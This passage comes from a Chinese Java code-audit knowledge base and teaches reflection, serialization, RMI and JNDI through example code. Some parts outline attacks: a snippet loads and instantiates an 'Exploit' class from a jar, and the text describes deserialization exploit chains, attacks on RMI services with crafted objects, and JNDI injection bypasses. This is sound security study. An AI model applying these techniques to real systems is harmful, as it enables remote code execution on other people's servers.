也可以搭建个web服务器用http协议来远程加载 URL url = new URL(\"file:/Users/d4m1ts/d4m1ts/tools/exp/exphub/fastjson/Exploit.jar\"); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); Class exploit = urlClassLoader.loadClass(\"Exploit\"); exploit.newInstance(); } } 参考 关于JVM类加载机制，看这一篇就够了 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/02.Java反射机制.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/02.Java反射机制.html","title":"02.Java反射机制","keywords":"","body":" 反射 何为反射 获取class的Class实例 方法一 方法二 方法三 方法四 比较 获取基本信息 小结 访问字段 获取字段的一些信息 获取字段的值 修改字段的值 小结 调用方法（‼️） 获取方法 调用方法 小结 调用构造方法 举例 小结 获取继承关系 获取父类class和interface 小结 动态代理 过程 小结 反射 何为反射 反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。即Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 class（包括interface）的本质是数据类型（Type） 而class是由JVM在执行过程中动态加载的。JVM在第一次读取到一种class类型时，将其加载进内存。 每加载一种class，JVM就为其创建一个Class类型的实例，并关联起来。注意：这里的Class类型是一个名叫Class的class。它长这样： public final class Class { private Class() {} } 以String类为例，当JVM加载String类时，它首先读取String.class文件到内存，然后，为String类创建一个Class实例并关联起来： Class cls = new Class(String); 这个Class实例是JVM内部创建的，如果我们查看JDK源码，可以发现Class类的构造方法是private，只有JVM能创建Class实例，我们自己的Java程序是无法创建Class实例的。 所以，JVM持有的每个Class实例都指向一个数据类型（class或interface） 由于JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息。 这种通过Class实例获取class信息的方法称为反射（Reflection）。 获取class的Class实例 获取一个class的Class实例，有4个方法： 方法一 直接通过一个class的静态变量class获取： Class cls = String.class; 方法二 如果我们有一个实例变量，可以通过该实例变量提供的getClass()方法获取： String s = \"Hello\"; Class cls = s.getClass(); 方法三 如果知道一个class的完整类名，可以通过静态方法Class.forName()获取： Class cls = Class.forName(\"java.lang.String\"); 方法四 利用classLoader Class cls = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\") 比较 因为Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例。可以用==比较两个Class实例： Class cls1 = String.class; String s = \"Hello\"; Class cls2 = s.getClass(); boolean sameClass = cls1 == cls2; // true 获取基本信息 获取class的基本信息 package org.example; import java.util.ArrayList; public class App{ public static void main(String[] args) { Class cls1 = String.class; ArrayList a = new ArrayList(); Class cls2 = a.getClass(); printInfo(cls1); printInfo(cls2); } static void printInfo(Class cls){ System.out.println(\"Class name : \" + cls.getName()); System.out.println(\"Simple name: \" + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\"Package name: \" + cls.getPackage().getName()); } System.out.println(\"is interface: \" + cls.isInterface()); System.out.println(\"is enum: \" + cls.isEnum()); System.out.println(\"is array: \" + cls.isArray()); System.out.println(\"is primitive: \" + cls.isPrimitive()); } } 小结 JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息； 获取一个class对应的Class实例后，就可以获取该class的所有信息； 通过Class实例获取class信息的方法称为反射（Reflection）； JVM总是动态加载class，可以在运行期根据条件来控制加载class。 访问字段 对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。 我们先看看如何通过Class实例获取字段信息。 获取字段的一些信息 import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { Class ot = OtherTest.class; System.out.println(Arrays.toString(ot.getFields())); // 获取所有public的field（包括父类） System.out.println(Arrays.toString(ot.getDeclaredFields())); // 获取当前类的所有field（不包括父类） System.out.println(ot.getField(\"a\")); // 根据字段名获取某个 public 的field（包括父类） System.out.println(ot.getDeclaredField(\"b\")); // 根据字段名获取当前类的某个field（不包括父类） System.out.println(ot.getField(\"a\").getName()); // 字段名称 System.out.println(ot.getField(\"a\").getType()); // 字段类型，也是一个Class实例 System.out.println(ot.getField(\"a\").getModifiers()); // 修饰符 } } class OtherTest extends emmTest{ public int a = 5; private int b; } class emmTest { public float cc; } [public int OtherTest.a, public float emmTest.cc] [public int OtherTest.a, private int OtherTest.b] public int OtherTest.a private int OtherTest.b a int 1 获取字段的值 先获取Class实例，再获取Field实例，然后，用Field.get(Object)获取指定实例的指定字段的值。 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 Object value = f.get(ot); // 从对象ot中获取值，因为所有的同类型class共用一个Class，所以获取内容要选定对象 System.out.println(value); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 haha 反射是一种非常规的用法，使用反射，首先代码非常繁琐，其次，它更多地是给工具或者底层框架来使用，目的是在不知道目标实例任何信息的情况下，获取特定字段的值。 此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。 修改字段的值 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 f.set(ot, \"modify\"); // 反射修改值 System.out.println(ot.getName()); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } public String getName() { return name; } } 小结 Java的反射API提供的Field类封装了字段的所有信息： 通过Class实例的方法可以获取Field实例：getField()，getFields()，getDeclaredField()，getDeclaredFields()； 通过Field实例可以获取字段信息：getName()，getType()，getModifiers()； 通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用setAccessible(true)来访问非public字段。 通过反射读写字段是一种非常规方法，它会破坏对象的封装。 调用方法（‼️） 获取方法 通过Class实例获取所有Method信息。Class类提供了以下几个方法来获取Method import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchMethodException { Class cls = OtherTest.class; // Class cls = ot.getClass(); System.out.println(Arrays.toString(cls.getMethods())); // 获取所有public的Method（包括父类） System.out.println(Arrays.toString(cls.getDeclaredMethods())); // 获取当前类的所有Method（不包括父类） System.out.println(cls.getMethod(\"echoEver\", String.class)); // 获取某个public的Method（包括父类） //.getMethod(方法名，这个方法的参数类型) System.out.println(cls.getDeclaredMethod(\"echoEver\", String.class)); // 获取当前类的某个Method（不包括父类） } } class OtherTest{ public void echoEver(String thing){ System.out.println(thing); } } // ===== /* [public void org.example.OtherTest.echoEver(java.lang.String), public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException, public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException, public final void java.lang.Object.wait() throws java.lang.InterruptedException, public boolean java.lang.Object.equals(java.lang.Object), public java.lang.String java.lang.Object.toString(), public native int java.lang.Object.hashCode(), public final native java.lang.Class java.lang.Object.getClass(), public final native void java.lang.Object.notify(), public final native void java.lang.Object.notifyAll()] [public void org.example.OtherTest.echoEver(java.lang.String)] public void org.example.OtherTest.echoEver(java.lang.String) public void org.example.OtherTest.echoEver(java.lang.String) */ 调用方法 获取Class实例 反射获取方法 invoke调用方法 package org.example; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { OtherTest ot = new OtherTest(); Class cls = ot.getClass(); Method echoEver = cls.getDeclaredMethod(\"echoEver\", String.class); echoEver.setAccessible(true); echoEver.invoke(ot,\"test\"); // 第一个参数是调用该方法的对象，第二个参数是一个可变长参数，是这个方法的需要传入的参数 } } class OtherTest{ private void echoEver(String thing){ System.out.println(thing); } } 小结 Java的反射API提供的Method对象封装了方法的所有信息： 通过Class实例的方法可以获取Method实例：getMethod()，getMethods()，getDeclaredMethod()，getDeclaredMethods()； 通过Method实例可以获取方法信息：getName()，getReturnType()，getParameterTypes()，getModifiers()； 通过Method实例可以调用某个对象的方法：Object invoke(Object instance, Object... parameters)； 通过设置setAccessible(true)来访问非public方法； 通过反射调用方法时，仍然遵循多态原则。 调用构造方法 举例 我们通常使用new操作符创建新的实例： Person p = new Person(); 如果通过反射来创建新的实例，可以调用Class提供的newInstance()方法： Person p = Person.class.newInstance(); 调用Class.newInstance()的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过Class.newInstance()来调用。 为了调用任意的构造方法，Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例： package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class App { public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class cls = Integer.class; System.out.println(cls.getName()); System.out.println(Arrays.toString(cls.getConstructors())); // Integer.class.getConstructor(int.class); Constructor cons1 = cls.getConstructor(int.class); Integer int1 = cons1.newInstance(123); System.out.println(int1); Constructor cons2 = cls.getConstructor(String.class); System.out.println(cons2.newInstance(\"456\")); } } /* java.lang.Integer [public java.lang.Integer(int), public java.lang.Integer(java.lang.String) throws java.lang.NumberFormatException] 123 456 */ 通过Class实例获取Constructor的方法如下： getConstructor(Class...)：获取某个public的Constructor； getDeclaredConstructor(Class...)：获取某个Constructor； getConstructors()：获取所有public的Constructor； getDeclaredConstructors()：获取所有Constructor。 注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。 调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。 小结 Constructor对象封装了构造方法的所有信息； 通过Class实例的方法可以获取Constructor实例：getConstructor()，getConstructors()，getDeclaredConstructor()，getDeclaredConstructors()； 通过Constructor实例可以创建一个实例对象：newInstance(Object... parameters)； 通过设置setAccessible(true)来访问非public构造方法。 获取继承关系 获取父类class和interface import java.util.Arrays; public class Test{ public static void main(String[] args) { OtherTest ot = new OtherTest(\"emm\"); Class cls = ot.getClass(); System.out.println(cls.getSuperclass()); // 获取父类class System.out.println(Arrays.toString(cls.getInterfaces())); // 获取接口 System.out.println(\"\".getClass().getSuperclass()); // 获取 String 的父类 } } class OtherTest extends Emmm implements Aaa{ private String name; public OtherTest(String name){ this.name = name; } @Override public void echo() { System.out.println(\"666\"); } } class Emmm { private int aa; } interface Aaa{ public void echo(); } /* class org.example.Emmm [interface org.example.Aaa] class java.lang.Object */ 小结 通过Class对象可以获取继承关系： Class getSuperclass()：获取父类类型； Class[] getInterfaces()：获取当前类实现的所有接口。 通过Class对象的isAssignableFrom()方法可以判断一个向上转型是否可以实现。 动态代理 有没有可能不编写实现类，直接在运行期创建某个interface的实例呢？ 这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。 所谓动态代理，是和静态相对应的。我们来看静态代码怎么写： // 创建接口 public interface Hello { void morning(String name); } // 实现接口Hello public class HelloWorld implements Hello { public void morning(String name) { System.out.println(\"Good morning, \" + name); } } // 创建实例，调用 public static void main(String[] args) { Hello hello = new HelloWorld(); hello.morning(\"Bob\"); } 动态如下 过程 ，不需要单独实现接口，而是动态实现接口。 过程 在运行期动态创建一个interface实例的方法如下： 定义一个InvocationHandler实例，它负责实现接口的方法调用； 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数： 使用的ClassLoader，通常就是接口类的ClassLoader； 需要实现的接口数组，至少需要传入一个接口进去； 用来处理接口方法调用的InvocationHandler实例。 将返回的Object强制转型为接口。 package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class App{ public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(args.length); // 实现对应的方法 if (method.getName().equals(\"echo\")){ System.out.println(args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(Hello.class.getClassLoader(), new Class[]{Hello.class}, handler); hello.echo(\"9999\"); } } interface Hello{ public void echo(String s); } /* 1 9999 */ 小结 Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例； 动态代理是通过Proxy创建代理对象，然后将接口方法“代理”给InvocationHandler完成的。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/03.Java序列化与反序列化.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/03.Java序列化与反序列化.html","title":"03.Java序列化与反序列化","keywords":"","body":" Java 序列化和反序列化 介绍 什么是序列化和反序列化 序列化要求 其他 序列化步骤 反序列化步骤 代码举例 序列化和反序列化 --> 文件 序列化和反序列化 --> bytes数组 序列化特征 安全性 反序列化漏洞的攻击流程 漏洞挖掘 Java 序列化和反序列化 介绍 序列化和反序列化都是在对象的基础上进行的！！！ 必须要 implements Serializable 的类才可以序列化和反序列化 什么是序列化和反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 序列化要求 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： public interface Serializable { } Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 其他 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外： public final void writeObject(Object x) throws IOException 上面的方法序列化一个对象，并将它发送到输出流。相似的 ObjectInputStream 类包含如下反序列化一个对象的方法： public final Object readObject() throws IOException, ClassNotFoundException 该方法从流中取出下一个对象，并将对象反序列化。它的返回值为Object，因此，你需要将它转换成合适的数据类型。 序列化步骤 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流； 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码举例 序列化和反序列化 --> 文件 package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 // 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // 调用writeObject方法，序列化对象到文件123.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // 反序列化 // 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // 调用readObject从123.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } 这里要注意以下要点： readObject() 方法中的 try/catch代码块尝试捕获 ClassNotFoundException 异常。对于 JVM 可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个 ClassNotFoundException 异常。 readObject() 方法的返回值被转化成 SerializeDemo引用。 序列化和反序列化 --> bytes数组 package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // 本体 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // 只是一个装饰器的作用 Filter模式，懂？ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ 序列化特征 十六进制查看我们生成的123.ser # hexdump没有xxd直观 xxd 123.ser xxd显示的结果，中间那一栏是文件的十六进制显示，最右边是字符显示。这里需要注意的特征值就是16进制显示时的前32位： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 安全性 因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 反序列化漏洞的攻击流程 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主重写（也可能是也有组件重写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主重写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等； 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(如commons-collections利用链) 重写readObject：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数重写点 漏洞挖掘 java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 举例如下： 可以看到自定义的readObject的确执行了，不过真实的应用中危险操作比较隐蔽。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/04.RMI基础.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/04.RMI基础.html","title":"04.RMI基础","keywords":"","body":" RMI概述 RMI实现机制 RMI实现举例 实现过程 实现举例 HelloInterface.java HelloImpl.java Server.java Client.java 注意事项 参考文章 RMI概述 RMI: 远程方法调用(Remote Method Invocation)，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。 Java RMI：用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟机中的对象的方法（一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法。），只不过是允许被远程调用的对象要通过一些标志加以标识。 提供服务的一方我们称之为服务器，而实现远程调用的一方我们称之为客户端。 具体实现方法： 远程服务器提供具体的类和方法，本地会通过某种方式获得远程类的一个代理，然后通过这个代理调用远程对象的方法，方法的参数是通过序列化与反序列化的方式传递的，所以： 只要服务端的对象提供了一个方法，这个方法接收的是一个Object类型的参数， 且远程服务器的classpath中存在可利用pop链，那么我们就可以通过在客户端调用这个方法，并传递一个精心构造的对象的方式来攻击rmi服务。 RMI实现机制 要实现RMI，服务器和客户端必须共享同一个接口。Java的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。 上面说了本地会通过某种方式获得远程对象的代理，那么具体是怎么的实现机制呢？RMI模式中除了有Client与Server，还借助了一个Registry(注册中心)。 因此，RMI由3个部分构成 第一个是rmiregistry（JDK提供的一个可以独立运行的程序，在bin目录下） 第二个是server端的程序，对外提供远程对象 第三个是client端的程序，想要调用远程对象的方法。 Server Registry Client 提供具体的远程对象 一个注册表，存放着远程对象的位置（ip、端口、标识符） 远程对象的使用者 其中Server与Registry可以在同一服务器上实现，也可以布置在不同服务器上，现在一个完整的RMI流程可以大概描述为： 启动Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。 Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的 Naming/Context/Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称。 Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称）再使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Server那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。 RMI的交互图： PS： 图中的stub就是客户端代理，skeleton就是服务端代理 远程方法调用的通信模式： RMI实现举例 实现过程 大概实现过程 定义远程接口 服务端实现远程接口 服务端注册远程对象 客户端调用接口 实现举例 HelloInterface.java // 定义一个远程接口 package com.company; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { // 创建接口，必须继承Remote String say (String name) throws RemoteException; // 每个函数必须要抛出 RemoteException 异常 } HelloImpl.java // 实现远程接口 package com.company; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; // 必须要这个，不然会报序列化的错 public class HelloImpl extends UnicastRemoteObject implements HelloInterface { public HelloImpl() throws RemoteException { // 必须要这个 super(); } @Override public String say(String name) throws RemoteException { // 实现刚才定义的接口的方法 return \"test \" + name; } } Server.java // 创建一个注册表，并注册远程对象 package com.company; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; //注册远程对象 public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException { HelloInterface helloService = new HelloImpl(); LocateRegistry.createRegistry(1099); // 创建 System.setProperty(\"java.rmi.server.hostname\",\"127.0.0.1\"); // 绑定IP，默认是 127.0.0.1 Registry registry = LocateRegistry.getRegistry(); // 获取实例 registry.bind(\"test\",helloService); // 注册远程对象 //Naming.bind(\"test\",helloService); // 上面2行可以用这个替换 } } Client.java // 查找远程调用方法，并且调用远程方法 package com.company; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main( String[] args ) throws RemoteException, NotBoundException, MalformedURLException { // HelloInterface hello = (HelloInterface) Naming.lookup(\"rmi://127.0.0.1:1099/test\"); // 写法都可 Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); HelloInterface hello = (HelloInterface) registry.lookup(\"test\"); System.out.println(hello.says(\"123123\")); } } 注意事项 接口需要继承Remote接口，且方法需要抛出RemoteException错误 接口的实现类需要继承UnicastRemoteObject，同样的方法需要抛出RemoteException错误 如果远程方法需要传参，需要保证参数是可序列化的，我这里传参只是传了字符串，字符串是可序列化的，如果传参是自定义的对象，那么这个对象需要实现Serilizable接口 如果服务端与客户端不在同一主机，需要保证调用的远程对象实现的远程接口在客户端与服务端都存在 参考文章 https://www.jianshu.com/p/5c6f2b6d458a https://blog.csdn.net/qq_28081453/article/details/83279066 https://www.cnblogs.com/fanghao/p/8918953.html https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/05.JNDI注入.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/05.JNDI注入.html","title":"05.JNDI注入","keywords":"","body":" 背景知识 JNDI Service Provider ObjectFactory JNDI概述 JNDI类 InitialContext类 构造方法 常用方法 Reference类 构造方法 常用方法 JNDI代码实现 实现过程 实现举例 HelloInterface.class（定义远程接口） HelloImpl.class（HelloInterface远程接口实现类） Server.class（注册远程对象并绑定） Client.class（远程调用） JNDI动态协议转换 JNDI Naming Reference JNDI注入 JNDI注入原理 JNDI注入的利用条件 JNDI注入攻击流程 JNDI注入举例 创建恶意类Evil（不能带package） 常见RMI服务端，绑定恶意的Reference到rmi注册表 客户端远程调用evil对应类 步骤 JNDI注入Debug 绕过高版本JDK（8u191+）限制 关于Codebase 关于JNDI Naming Reference的限制 绕过高版本JDK限制：利用本地Class作为Reference Factory 利用举例 pom.xml（双方均需要） Server Client 几种变体的表达式 Debug分析 总结 绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget 利用举例 生成POC LDAP Server Client Debug分析 调用栈 建议 参考 背景知识 JNDI Service Provider JNDI 与 JNDI Service Provider 的关系类似于 Windows 中 SSPI 与 SSP 的关系。前者是统一抽象出来的接口，而后者是对接口的具体实现。如默认的 JNDI Service Provider 有 RMI/LDAP 等等。 ObjectFactory 每一个 Service Provider 可能配有多个 Object Factory。Object Factory 用于将 Naming Service（如 RMI/LDAP）中存储的数据转换为 Java 中可表达的数据，如 Java 中的对象或 Java 中的基本数据类型。 JNDI 的注入的问题就出在了可远程下载自定义的 ObjectFactory 类上。你如果有兴趣的话可以完整看一下 Service Provider 是如何与多个 ObjectFactory 进行交互的。 JNDI概述 JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。 JNDI是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，就像人的名字或DNS中的域名与IP的关系。 JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接口组成。我们的应用可以通过JNDI的API去访问相关服务提供的接口 JDNI的服务是可以拓展的，可以从JNDI页面下载其他服务提供商，也可以从远程获得其他服务提供商 JDK包括以下命名/目录服务的服务： 轻型目录访问协议（ldap） 通用对象请求代理体系结构（CORBA），通用对象服务（COS）名称服务 Java远程方法调用（RMI）注册表 域名服务（DNS） Java命名和目录接口（JNDI）是一种Java API，类似一个索引中心，它允许客户端通过name发现和查找数据和对象。其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。 代码格式如下： //指定需要查找name名称 String jndiName= \"Test\"; //初始化默认环境 Context context = new InitialContext(); //查找该name的数据 DataSource ds = (DataSourse)context.lookup(jndiName); 这里的jndiName变量的值可以是上面的命名/目录服务列表里面的值，如果JNDI名称可控的话可能会被攻击。 那上面提到的命名和目录是什么？ 命名服务：命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务：目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象 举个例子：比如你要在某个学校里里找某个人，那么会通过：年级->班级->姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。LDAP是典型的目录服务 其实，仔细一琢磨就会感觉其实命名服务与目录服务的本质是一样的，都是通过键来查找对象，只不过目录服务的键要灵活且复杂一点。 